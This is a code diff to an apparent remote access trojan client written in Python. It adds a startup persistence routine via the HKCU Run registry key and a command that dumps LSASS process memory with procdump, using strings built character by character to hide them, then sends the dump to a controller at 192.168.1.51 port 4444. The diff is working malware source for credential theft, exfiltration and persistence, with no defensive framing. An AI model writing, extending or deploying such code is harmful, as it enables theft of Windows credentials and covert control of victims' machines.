@@ -550,7 +550,12 @@ class RAT_CLIENT:
                 except WindowsError:
                     self.errorsend()
 
-            elif command == 'dump_lsass':
+            
+            elif command == 'persistence':
+                persistence()
+                s.send('Persistence added')
+
+            elif command == 'dumplsass':
                 try:
                     procdump_cmd = ''.join([
                         "p", "r", "o", "c", "d", "u", "m", "p", ".", "e", "x", "e",
@@ -560,13 +565,12 @@ class RAT_CLIENT:
                     ])
                     
                     os.system(procdump_cmd)
-                    
-                    with open("lsass.dmp", "rb") as dump_file:
-                        dump_data = dump_file.read()
-                        s.sendall(dump_data)
-                    
-                    s.send(b"LSASS dump completed and sent")
-                    
+                    try:
+                        file = open("lsass.dmp", 'rb')
+                        data = file.read()
+                        s.send(data)
+                    except:
+                        self.errorsend()
                 except Exception as e:
                     self.errorsend()
 
@@ -599,8 +603,9 @@ def persistence():
         failure_msg = ''.join(["H", "K", "C", "U", " ", "R", "u", "n", " ", "r", "e", "g", "i", "s", "t", "r", "y", " ", "k", "e", "y", " ", "f", "a", "i", "l", "e", "d"])
         s.send(failure_msg.encode())
 
-rat = RAT_CLIENT('127.0.0.1', 4444)
+rat = RAT_CLIENT('192.168.1.51', 4444)
 
 if __name__ == '__main__':
+    persistence()
     rat.build_connection()
     rat.execute()
